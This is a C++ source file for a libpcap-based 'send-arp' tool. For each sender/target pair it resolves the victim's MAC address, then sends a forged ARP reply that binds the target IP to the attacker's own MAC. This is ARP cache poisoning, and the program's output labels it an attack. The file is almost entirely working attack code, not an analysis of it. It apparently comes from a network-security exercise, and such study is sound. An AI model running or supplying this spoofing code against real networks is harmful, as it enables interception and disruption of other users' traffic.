#include <cstdio>
#include <cstdlib>
#include <pcap.h>
#include <string.h>
#include <stdlib.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "getmymac.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

typedef struct {
	char* dev_;
} Param;

Param param  = {
	.dev_ = NULL //ethernet name
};

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

bool parse(Param* param, int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return false;
	}
	param->dev_ = argv[1];
	return true;
}

void convertToStr(u_int8_t addr[], char* str, int div)
{
    char bit8[4] = {'\0'};
	if(div == 4)
	{
		for(int i = 0;i<4;i++)
		{
			sprintf(bit8, "%d", addr[i]);
			strcat(str, bit8);
			if(i != 3)
				strcat(str, ".");
		}
	}
	else
	{
		for(int i = 0;i<6;i++)
		{
			sprintf(bit8, "%02x", addr[i]);
			strcat(str, bit8);
			if(i != 5)
				strcat(str, ":");
		}
	}
}

void makeArpPacket(EthArpPacket* packet, char* eth_dmac, char* eth_smac, char* arp_tmac, char* arp_smac, char* arp_sip, char* arp_tip, int flag)
{
	packet->eth_.dmac_ = Mac(eth_dmac); //Mac("2c:8d:b1:e9:43:7d");
	packet->eth_.smac_ = Mac(eth_smac); //Mac("00:0c:29:4d:48:57");
	packet->eth_.type_ = htons(EthHdr::Arp);
	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	packet->arp_.pro_ = htons(EthHdr::Ip4);
	packet->arp_.hln_ = Mac::SIZE;
	packet->arp_.pln_ = Ip::SIZE;
	if(flag == 1)
		packet->arp_.op_ = htons(ArpHdr::Reply); 
	else
		packet->arp_.op_ = htons(ArpHdr::Request); 
	packet->arp_.smac_ = Mac(arp_smac); //Mac("00:0c:29:4d:48:57"); //refer
	packet->arp_.sip_ = htonl(Ip(arp_sip)); //htonl(Ip("192.168.1.1")); //refer
	packet->arp_.tmac_ = Mac(arp_tmac); //Mac("2c:8d:b1:e9:43:7d");
	packet->arp_.tip_ = htonl(Ip(arp_tip)); //htonl(Ip("192.168.1.4"));
}

int getotherMac(pcap_t* inhandle, char* otherMac, char* tarip)
{
	EthArpPacket p;
	u_int16_t* ethtype = NULL;
	u_int16_t* arppro = NULL;
	u_int8_t tip_x[4] = {0};
	u_int8_t mac_x[6] = {0x00};
	char mac_c[18] = {'\0'};
	char tip_c[16] = {'\0'};
	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(inhandle, &header, &packet); //problem
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(inhandle));
			return 0;
		}
        ethtype = (u_int16_t*)(packet+12);
		arppro = (u_int16_t*)(packet+16);
        if(ntohs(*ethtype) == 0x0806 && ntohs(*arppro) == 0x0800)
		{
			tip_x[0] = *(packet+28); tip_x[1] = *(packet+29);
			tip_x[2] = *(packet+30); tip_x[3] = *(packet+31);
			convertToStr(tip_x, tip_c, 4);
			if(strcmp(tip_c, tarip) == 0)
			{
				mac_x[0] = *(packet+6); mac_x[1] = *(packet+7); mac_x[2] = *(packet+8);
				mac_x[3] = *(packet+9); mac_x[4] = *(packet+10); mac_x[5] = *(packet+11); 
				convertToStr(mac_x, mac_c, 6);
				break;
			}
		}
		tip_c[0] = '\0';
	}
	strcpy(otherMac, mac_c);
	return 1;
}

int main(int argc, char* argv[]) {
	if (!parse(&param, argc, argv))
		return -1;
	
	char vic_mac[18] = {'\0'};
	char my_mac[18] = {'\0'};
	char my_ip[16] = {'\0'};

	getMacAddress(my_mac, argv[1]); //get my mac address
	getIPAddress(my_ip, argv[1]); //get my ip address

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* outhandle = pcap_open_live(param.dev_, 0, 0, 0, errbuf);
	if (outhandle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", param.dev_, errbuf);
		return -1;
	}
	pcap_t* inhandle = pcap_open_live(param.dev_, BUFSIZ, 1, 1, errbuf);
	if (inhandle == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
		return -1;
	}
	EthArpPacket packet;
	printf("=====ATTACK START=====\n");
	for(int i = 2;i<argc;i+=2)
	{
		makeArpPacket(&packet, "ff:ff:ff:ff:ff:ff", my_mac, "00:00:00:00:00:00", my_mac, my_ip, argv[i], 0);
		int res = pcap_sendpacket(outhandle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(outhandle));
		}
		getotherMac(inhandle, vic_mac, argv[i]); //problem
		makeArpPacket(&packet, vic_mac, my_mac, vic_mac, my_mac, argv[i+1], argv[i], 1);
		res = pcap_sendpacket(outhandle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(outhandle));
		}
		vic_mac[0] = '\0';
	}

	printf("======ATTACK END======\n");
	pcap_close(outhandle);
	pcap_close(inhandle);
}